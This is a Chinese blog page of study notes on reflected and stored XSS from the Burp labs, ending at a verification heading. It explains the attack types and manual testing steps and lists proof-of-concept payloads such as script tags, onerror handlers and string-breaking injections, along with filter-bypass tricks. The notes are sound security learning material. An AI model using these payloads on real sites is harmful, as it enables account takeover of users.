@@ -1,0 +1,1146 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="记录学习过程和题解">
+<title>Burp靶场：XSS 跨站脚本注入（待完善）</title>
+
+<link rel='canonical' href='https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-xss/'>
+
+<link rel="stylesheet" href="/scss/style.min.b13448cb6a9f11e8e6aeb548ed55eed4ad65121ff58a1b734bc897438af28d62.css"><meta property='og:title' content="Burp靶场：XSS 跨站脚本注入（待完善）">
+<meta property='og:description' content="记录学习过程和题解">
+<meta property='og:url' content='https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-xss/'>
+<meta property='og:site_name' content='Calendar&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='Burp靶场' /><meta property='article:published_time' content='2025-11-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-22T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Burp靶场：XSS 跨站脚本注入（待完善）">
+<meta name="twitter:description" content="记录学习过程和题解"><link rel="alternate" type="application/json" href="https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-xss/index.json">
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/calendar0917/images/master/20251021223022235.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/images/1_hu_b5fde55a1ef6fadd.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Calendar&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/calendar0917'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#707070"
+     stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+     class="icon icon-tabler icons-tabler-outline icon-tabler-square-rounded-arrow-up">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+    <path d="M16 12l-4 -4l-4 4"/>
+    <path d="M12 16v-8"/>
+    <path d="M12 3c7.2 0 9 1.8 9 9s-1.8 9 -9 9s-9 -1.8 -9 -9s1.8 -9 9 -9z"/>
+</svg>
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#知识">知识</a>
+      <ol>
+        <li><a href="#原理">原理</a></li>
+      </ol>
+    </li>
+    <li></li>
+    <li>
+      <ol>
+        <li><a href="#验证xss漏洞poc">验证XSS漏洞（PoC）</a></li>
+        <li><a href="#反射型">反射型</a>
+          <ol>
+            <li><a href="#示例">示例</a></li>
+          </ol>
+        </li>
+        <li></li>
+        <li>
+          <ol>
+            <li><a href="#影响">影响</a></li>
+            <li><a href="#攻击方式">攻击方式</a></li>
+            <li><a href="#漏洞发现">漏洞发现</a></li>
+          </ol>
+        </li>
+        <li><a href="#存储型">存储型</a>
+          <ol>
+            <li><a href="#示例-1">示例</a></li>
+            <li><a href="#影响-1">影响</a></li>
+            <li><a href="#漏洞发现-1">漏洞发现</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#漏洞发现-2">漏洞发现</a></li>
+          </ol>
+        </li>
+        <li>
+          <ol>
+            <li><a href="#漏洞利用">漏洞利用</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li></li>
+    <li></li>
+    <li></li>
+    <li>
+      <ol>
+        <li><a href="#悬挂标记注入">悬挂标记注入</a></li>
+        <li>
+          <ol>
+            <li><a href="#示例-2">示例</a></li>
+            <li></li>
+          </ol>
+        </li>
+        <li></li>
+        <li>
+          <ol>
+            <li><a href="#防护措施">防护措施</a></li>
+          </ol>
+        </li>
+        <li><a href="#csp-内容安全策略">CSP 内容安全策略</a></li>
+      </ol>
+    </li>
+    <li>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#缓解xss攻击">缓解XSS攻击</a></li>
+            <li><a href="#缓解悬挂标记注入攻击">缓解悬挂标记注入攻击</a></li>
+            <li><a href="#防护点击劫持攻击">防护点击劫持攻击</a></li>
+            <li><a href="#csp的绕过技巧">CSP的绕过技巧</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #3654aa; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/burp%E9%9D%B6%E5%9C%BA-xss/">Burp靶场：XSS 跨站脚本注入（待完善）</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            记录学习过程和题解
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 22, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="知识">知识
+</h2><p><a class="link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"  target="_blank" rel="noopener"
+    >XSS速查表</a></p>
+<h3 id="原理">原理
+</h3><h2 id="">
+</h2><p>XSS（Cross-site scripting）就是网站的一个安全漏洞——攻击者能利用这个漏洞，搞乱用户和网站的正常交互。</p>
+<p>浏览器原本禁止不同网站之间随便访问对方的数据（比如打开淘宝，淘宝不能直接读取你微信的数据），这就是<strong>同源策略</strong>。但XSS能绕开这个规则。</p>
+<p>一旦网站有XSS漏洞，攻击者就能伪装成受害用户，干用户能做的所有事（比如发消息、转账），还能看用户的所有数据（比如个人信息、登录凭证）。如果这个用户是网站管理员（有最高权限），攻击者甚至能完全控制整个网站。</p>
+<h2 id="">
+</h2><p>工作机制很简单：攻击者让有漏洞的网站，给用户返回一段恶意的JavaScript代码。等用户打开网站，这段代码就在用户的浏览器里自动执行了——这时候，用户和网站的交互就被攻击者完全操控了。</p>
+<p>XSS 攻击主要分 3 种：</p>
+<ol>
+<li><strong>反射型 XSS</strong>：恶意代码藏在当前的 HTTP 请求里（比如搜索框输入、URL 参数里），网站没处理就直接返回，浏览器一执行就中招。</li>
+<li><strong>存储型 XSS</strong>：恶意代码会被网站存到数据库里（比如评论区、个人资料页），只要有人打开包含这段代码的页面，就会自动执行 —— 相当于把恶意代码留在网站上，谁来谁中招。</li>
+<li><strong>DOM 型 XSS</strong>：这个漏洞不在网站服务器的代码里，而是在你浏览器端的代码（比如网页里的 JavaScript）里，是客户端自己处理数据时出的问题。</li>
+</ol>
+<h3 id="验证xss漏洞poc">验证XSS漏洞（PoC）
+</h3><p>想知道一个网站有没有XSS漏洞，最直接的办法就是“注入测试代码”：往网站的输入框（比如评论区、搜索框）里填一段JavaScript代码，看能不能让浏览器执行。</p>
+<p>以前大家都用<code>alert()</code>函数做测试——这函数特别好用：代码就几个字、没危险，而且一旦执行成功，浏览器会弹出一个提示框，一眼就能看出来漏洞存在。大部分情况只要让模拟用户的浏览器弹出这个提示框，就算验证成功了。</p>
+<p>不过有个小坑：用Chrome浏览器的话，从92版本（2021年7月更新）开始，跨网站的iframe里不能用<code>alert()</code>了。有些复杂的XSS攻击需要用到这种iframe，这时候就换个测试代码——用<code>print()</code>函数就行（执行后会弹出打印页面，同样能验证漏洞）。</p>
+<h3 id="反射型">反射型
+</h3><p>应用程序从HTTP请求中接收数据后，未经过安全处理便将其<strong>直接嵌入即时响应内容</strong>中，导致恶意脚本被浏览器执行。其核心特征是恶意代码通过请求“反射”至响应结果，仅在单次请求-响应周期中生效，不涉及数据存储。</p>
+<h4 id="示例">示例
+</h4><h3 id="">
+</h3><p>假设某网站的搜索功能通过URL参数接收用户输入的关键词，例如用户搜索“gift”时，请求URL如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/search?term=gift
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>应用程序收到请求后，会将参数<code>term</code>的值直接回显到响应页面中，返回的HTML内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>您搜索的关键词：gift<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时数据仅作为正常文本展示，无安全风险。</p>
+<h3 id="">
+</h3><p>当应用程序未对请求参数进行过滤、转义等安全处理时，攻击者可构造包含恶意JavaScript代码的URL：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/search?term=&lt;script&gt;/* 恶意代码逻辑 */&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>应用程序依然直接回显参数内容，导致响应中包含恶意脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>您搜索的关键词：<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="cm">/* 恶意代码逻辑 */</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当受害者点击该恶意URL时，恶意脚本会在其浏览器中执行，且执行上下文与受害者的应用程序会话相关联——攻击者可借此获取用户会话凭证、篡改页面内容等。</p>
+<h4 id="影响">影响
+</h4><p>若攻击者能够控制在受害用户浏览器中执行的脚本，通常可完全攻陷该用户的账户与交互环境。具体而言，攻击者可实现以下操作：</p>
+<ol>
+<li>执行受害用户在应用内有权限完成的任意操作；</li>
+<li>查看受害用户可访问的所有信息；</li>
+<li>修改受害用户有权限更改的各类数据；</li>
+<li>以<strong>受害用户的身份</strong>与应用内其他用户发起交互（包括实施恶意攻击），且此类操作会显示为受害用户本人所为。</li>
+</ol>
+<p>攻击者需通过<strong>外部传播渠道</strong>诱导受害用户发起受控请求，方可成功实施反射型 XSS 攻击。常见传播手段包括：</p>
+<ul>
+<li>在自身控制的网站或支持用户生成内容的第三方平台上植入恶意链接；</li>
+<li>通过电子邮件、推特（Twitter）或其他即时通讯工具向目标用户发送恶意链接。</li>
+</ul>
+<h4 id="攻击方式">攻击方式
+</h4><p>反射型XSS存在多种具体表现形式，其漏洞利用所需的攻击载荷（Payload）类型及漏洞影响范围，主要取决于以下两个核心因素：</p>
+<ol>
+<li>反射数据在响应中的位置</li>
+</ol>
+<p>应用程序将用户输入数据反射至响应内容时，会嵌入不同的上下文场景（如HTML标签内、标签属性中、JavaScript代码块里等），不同位置对攻击载荷的格式要求截然不同。</p>
+<ul>
+<li>示例1：数据嵌入HTML标签文本中（如<code>&lt;p&gt;用户输入&lt;/p&gt;</code>），通常需使用<code>&lt;script&gt;</code>等标签构造恶意脚本；</li>
+<li>示例2：数据嵌入HTML标签属性中（如<code>&lt;img src=&quot;用户输入&quot;&gt;</code>），可能需要先闭合属性引号（如<code>&quot;onload=恶意代码&quot;</code>）再注入脚本；</li>
+<li>示例3：数据嵌入JavaScript代码中（如<code>var x = &quot;用户输入&quot;</code>），需先闭合字符串或代码块（如<code>&quot;; 恶意代码; //</code>）才能让脚本执行。</li>
+</ul>
+<ol start="2">
+<li>应用程序对提交数据的预处理</li>
+</ol>
+<p>若应用程序在反射数据前，对用户输入执行了验证、过滤或编码等处理（如过滤<code>&lt;script&gt;</code>标签、将特殊字符转义为HTML实体等），则需针对性调整攻击载荷：</p>
+<ul>
+<li>若过滤了<code>&lt;script&gt;</code>标签，可改用<code>&lt;img onload&gt;</code>、<code>&lt;svg onload&gt;</code>等不含被过滤关键词的事件驱动型脚本；</li>
+<li>若对<code>&lt;</code>、<code>&gt;</code>等字符进行了HTML编码，可尝试在JavaScript上下文或属性上下文等未编码的场景中注入，或利用<strong>编码绕过</strong>技巧（如大小写混淆、特殊字符替换）。</li>
+</ul>
+<h4 id="漏洞发现">漏洞发现
+</h4><p>绝大多数反射型XSS漏洞可通过Burp Suite的Web漏洞扫描器快速、可靠地检测到。以下是<strong>手动测试反射型XSS漏洞的完整步骤</strong>，结合实战场景拆解操作逻辑：</p>
+<p><strong>一、覆盖所有输入入口</strong></p>
+<p>需逐一测试应用程序HTTP请求中所有可能<strong>传入数据的入口</strong>，确保无遗漏：</p>
+<ul>
+<li>核心输入点：URL查询字符串（如<code>?id=123</code>）、POST请求体（表单数据）、URL路径（如<code>/user/[输入值]</code>）；</li>
+<li>可选测试点：HTTP请求头（如Referer、User-Agent、Cookie等）—— 需注意：部分仅能通过特定请求头触发的XSS类行为，实际可能无法利用（因浏览器对请求头的输入限制或同源策略约束）。</li>
+</ul>
+<p><strong>二、提交随机字母数字值，验证数据是否反射</strong></p>
+<p><strong>构造测试值</strong>：为每个输入入口提交一个<strong>唯一的随机字母数字值</strong>（如<code>x7z9p2q5</code>）。要求：</p>
+<ul>
+<li>仅含字母数字（避免触发输入验证拦截）；</li>
+<li>长度约8字符（既简短易通过验证，又能降低响应中偶然匹配的概率）；</li>
+</ul>
+<p><strong>工具辅助高效测试</strong>：</p>
+<ul>
+<li>用Burp Intruder的“随机生成十六进制值”功能生成测试值；</li>
+<li>开启Burp Intruder的“Grep Payloads”设置，自动标记包含提交值的响应（快速筛选出存在反射的入口）；</li>
+</ul>
+<p><strong>核心目的</strong>：确认提交的随机值是否原封不动（或仅轻微修改）出现在响应内容中—— <strong>存在反射</strong>是触发XSS的前提。</p>
+<p><strong>三、确定反射上下文</strong></p>
+<p>针对响应中随机值出现的每个位置，分析其<strong>嵌入上下文</strong>（不同上下文需对应不同攻击载荷），常见场景包括：</p>
+<ul>
+<li>HTML标签间文本：如<code>&lt;p&gt;随机值&lt;/p&gt;</code>（直接嵌入标签内容）；</li>
+<li>带引号的标签属性：如<code>&lt;input value=&quot;随机值&quot;&gt;</code>（可能是单引号、双引号或无引号包裹）；</li>
+<li>JavaScript代码中：如<code>var data = &quot;随机值&quot;;</code>（嵌入脚本字符串、注释或代码块）；</li>
+<li>CSS样式中：如<code>&lt;style&gt;body{color:随机值;}&lt;/style&gt;</code>（较少见，但需注意上下文约束）。</li>
+</ul>
+<p><strong>四、测试候选 Payload</strong></p>
+<p>根据反射上下文，设计能触发JavaScript执行的初始候选载荷，操作步骤：</p>
+<ol>
+<li>将请求发送到Burp Repeater（右键请求 → Send to Repeater）；</li>
+<li>保留原始随机值（作为定位标记），在其前后插入候选载荷（如在<code>x7z9p2q5</code>前添加<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>）；</li>
+<li>在Burp Repeater的响应视图中，搜索原始随机值—— Burp会高亮所有反射位置，便于快速查看载荷是否被原样保留；</li>
+<li>核心判断：若载荷未被修改且符合上下文语法（如标签闭合正确、引号匹配），则可能触发XSS。</li>
+</ol>
+<p><strong>五、测试替代载荷（应对输入过滤/修改）</strong></p>
+<p>若候选载荷被应用程序过滤（如移除<code>&lt;script&gt;</code>标签）、编码（如将<code>&lt;</code>转义为<code>&amp;lt;</code>）或拦截，则需根据反射上下文和输入验证规则，调整载荷策略：</p>
+<ul>
+<li>上下文适配：如HTML属性中用<code>&quot;onload=alert(1)x=&quot;</code>（闭合属性引号+事件触发），JavaScript中用<code>&quot;;alert(1);//</code>（闭合字符串+注释后续代码）；</li>
+<li>绕过过滤：如大小写混淆（<code>&lt;Script&gt;alert(1)&lt;/Script&gt;</code>）、标签替换（<code>&lt;img src=x onerror=alert(1)&gt;</code>替代<code>&lt;script&gt;</code>）、特殊字符编码（如URL编码、Unicode编码）；</li>
+<li>参考：可结合“跨站脚本攻击上下文”相关知识，针对性设计载荷。</li>
+</ul>
+<p><strong>六、在浏览器中验证攻击效果</strong></p>
+<p>若在Burp Repeater中确认载荷有效，需在真实浏览器中验证（避免工具环境与实际浏览器的差异导致误判）：</p>
+<ol>
+<li>触发方式：
+<ul>
+<li>URL参数注入：直接将含载荷的URL粘贴到浏览器地址栏；</li>
+<li>POST请求/请求头注入：用Burp Proxy拦截请求，修改参数后放行，观察浏览器行为；</li>
+</ul>
+</li>
+<li>验证脚本：推荐执行简单可见的JavaScript（如<code>alert(document.domain)</code>），若浏览器弹出包含当前域名的提示框，则说明XSS漏洞已成功利用。</li>
+</ol>
+<h3 id="存储型">存储型
+</h3><p>应用程序从不可信来源接收数据后，未经过安全处理便将其纳入后续的 HTTP 响应中，导致恶意脚本被浏览器执行的漏洞类型。其核心特征是恶意数据会<strong>被应用程序持久化存储</strong>（如存入数据库），而非仅在单次请求 - 响应周期中临时传递。</p>
+<h4 id="示例-1">示例
+</h4><p>假设某网站支持用户对博客文章提交评论，且评论内容会对所有访问该文章的用户展示。用户提交评论时，发送的HTTP请求如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/post/comment</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">vulnerable-website.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">100</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="g">postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>评论提交后，任何访问该博客文章的用户，都会在应用程序的响应中看到该评论内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>This post was extremely helpful.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时数据仅作为正常评论展示，无安全风险。</p>
+<p>若应用程序未对评论内容进行过滤、转义等安全处理，攻击者可提交包含恶意JavaScript代码的评论。在攻击者发送的请求中，恶意评论会被URL编码（避免传输过程中出现解析异常）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>该恶意评论会被应用程序存储至数据库。当其他用户访问该博客文章时，应用程序会从数据库中读取该评论并嵌入响应内容，返回结果如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="cm">/* Bad stuff here... */</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时，攻击者注入的恶意脚本会在受害用户的浏览器中执行，且执行上下文与受害用户的应用程序会话相关联。</p>
+<h4 id="影响-1">影响
+</h4><p>存储型 XSS 与反射型 XSS 的关键区别在于<strong>攻击的自包含性</strong>：</p>
+<ul>
+<li>存储型 XSS 的攻击完全依托应用程序自身完成：攻击者只需将恶意脚本注入并存储到应用中（如评论区、数据库），无需依赖外部渠道诱导用户触发（如发送恶意 URL、诱导提交表单），只需等待用户自然访问包含恶意脚本的页面即可。</li>
+<li>反射型 XSS 则依赖外部触发：攻击者必须通过邮件、社交平台等外部方式，诱导用户主动发起包含恶意代码的请求，攻击才能生效。</li>
+</ul>
+<p>当 XSS 漏洞仅影响<strong>已登录用户</strong>时，存储型 XSS 的自包含特性会显著提升攻击成功率：</p>
+<ul>
+<li>反射型 XSS 的攻击存在 “时间窗口限制”：若用户点击恶意链接时未登录应用，攻击将无法利用用户会话权限，大概率失效；</li>
+<li>存储型 XSS 可完全规避该问题：用户只有在登录状态下才会访问包含恶意脚本的页面（如已登录用户查看评论、个人中心等），一旦访问，恶意脚本会直接在用户的登录会话上下文的中执行，攻击成功率极高。</li>
+</ul>
+<h4 id="漏洞发现-1">漏洞发现
+</h4><p>一、明确测试范围</p>
+<p>需测试的输入入口（数据进入应用的渠道）</p>
+<p>所有攻击者可注入数据的场景均需覆盖，包括：</p>
+<ul>
+<li>核心输入点：URL 查询字符串、POST 请求体中的参数 / 数据，URL 文件路径（如<code>/profile/[输入值]</code>）；</li>
+<li>特殊输入点：部分在反射型 XSS 中难以利用的 HTTP 请求头（存储型场景下可能被持久化，需纳入测试）；</li>
+<li>带外输入渠道（取决于应用功能）：攻击者通过非直接交互方式提交数据的路径，例如：
+<ul>
+<li>邮件应用：处理收到的邮件内容；</li>
+<li>社交动态展示应用：解析第三方平台（如 Twitter）的推文数据；</li>
+<li>新闻聚合应用：嵌入其他网站的来源数据。</li>
+</ul>
+</li>
+</ul>
+<p>需测试的输出出口（数据展示的场景）</p>
+<p>所有可能向用户返回数据的 HTTP 响应场景，包括：</p>
+<ul>
+<li>公开页面（如博客评论区、商品评价页）；</li>
+<li>私密页面（如用户个人中心、后台管理面板）；</li>
+<li>特殊功能页面（如审计日志、历史操作记录、通知列表）。</li>
+</ul>
+<p>二、手测</p>
+<p>若逐一测试 “输入 - 输出” 的所有组合（每个输入对应每个输出），在多页面应用中完全不现实。更高效的做法是：</p>
+<ol>
+<li>系统性遍历输入入口：为每个输入点提交一个<strong>唯一标识值</strong>（如<code>stored_xss_test_123</code>）；</li>
+<li>监控应用响应：观察所有后续访问的页面响应，检测该标识值是否出现；</li>
+<li>重点关注高风险功能：优先测试评论区、个人资料编辑、动态发布等典型存储场景；</li>
+<li>验证数据持久性：若标识值出现在响应中，需确认该数据是 “跨请求存储”（如数据库存储），而非仅在单次请求中反射（避免误判为反射型 XSS）。</li>
+</ol>
+<p>三、漏洞验证</p>
